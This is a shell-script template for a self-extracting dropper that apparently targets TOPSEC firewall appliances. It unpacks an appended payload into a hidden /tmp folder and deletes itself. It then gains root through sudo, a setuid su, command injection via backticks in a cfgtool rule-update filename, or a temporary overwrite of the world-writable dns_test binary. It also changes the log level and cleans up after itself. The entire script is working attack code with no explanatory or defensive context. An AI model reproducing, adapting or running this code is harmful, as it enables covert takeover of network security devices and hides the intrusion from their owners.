#!/bin/sh
rm -f /tmp/cgi*
lfolder=/tmp/.temp-{rand}a
mkdir $lfolder
lfile=$lfolder/.temp-{rand}a
cd $lfolder

if [ -f $lfile ]
then
    exit 0
fi
tmp="$lfolder/httpd"
tmp2="$lfolder/htttpd"
tmp3=httppd
PATH=$lfolder:$PATH

ips=`/sbin/ifconfig | grep "addr:[0-9.]*" | cut -f 2 -d ":" | cut -f 1 -d " "`
ip=`for i in $ips; do if [ "$i" != "127.0.0.1" ]; then echo $i; break; fi; done;`

if [ "$ip" = "" ]
then
    ip="1.2.3.4"
fi

dd if=$0 of=$lfolder/.a2 bs={flen} skip=1 > $lfile  2>&1 
rm -f $0
tar zxvf $lfolder/.a2 -C $lfolder/
rm -f $lfolder/.a2
chmod +x $tmp
chmod +x $tmp2
chmod +x $tmp3


if [ "`uname -a | grep 86`" != "" ]
then
    if [ "`id -u 2> $lfile`" = "0" ]
    then
        {cmd}
    elif [ -f "/tos/bin/sudo" ]
    then
        /tos/bin/sudo sh -c "{cmd}"
    elif [ -f "/bin/su" ] && [  "`find /bin/tinylogin -perm -4000`" != "" ]
    then
        /bin/su -c "{cmd}"
    elif [ -f "/tos/so/liblogcfg.so" ]
    then
        old_level=`/tos/bin/cfgtool show-running | grep 'log log level_set' | sed 's/[^0-7]*//g'`
        



        $tmp3 0

        if [ $? -eq 0 ]
        then
            if [ "`/tos/bin/cfgtool ar version`" != "" ]
            then
                
                echo "#!/bin/sh
                cd $lfolder
                {cmd}
                rm /tmp/.b
                rm /tmp/ar-rules-update.tir
                kill \$PPID" > /tmp/.b
                chmod +x /tmp/.b
                /tos/bin/cfgtool 'ar rules update filename `/tmp/.b` type ar url http://topsec.com.cn' 
            elif [ "`find /tos/bin/dns_test -perm 777`" != "" ]
            then
                cp /tos/bin/dns_test /tmp/.dt
                dconf=`/tos/bin/cfgtool show-running | grep "network dns set"`
                orig=$dconf
                if [ "$dconf" = "" ]
                then
                    dconf="network dns set dns1 $ip dns2 $ip dns3 $ip "
                    orig="network dns clean"
                fi
                nconf=`echo $dconf | sed "s/test-domain-name.*//g"`
                dmn=`echo $dconf | grep "test-domain-name" | sed "s/.*test-domain-name//g"`

                if [ "$dmn" = "" ]
                then
                    dmn="www.topsec.com.cn"
                fi
                /tos/bin/cfgtool $nconf
                echo "#!/bin/sh
                {cmd}
                rm $tmp
                cp /tmp/.dt /tos/bin/dns_test && rm /tmp/.dt
                /tos/bin/cfgtool $orig" > /tos/bin/dns_test
                /tos/bin/cfgtool "$nconf test-domain-name $dmn"
            else
                {cmd}
            fi
            $tmp3 $old_level
        else
            {cmd}
        fi
    else
        {cmd}
    fi
fi

rm -rf $lfolder
kill $PPID
exit 0
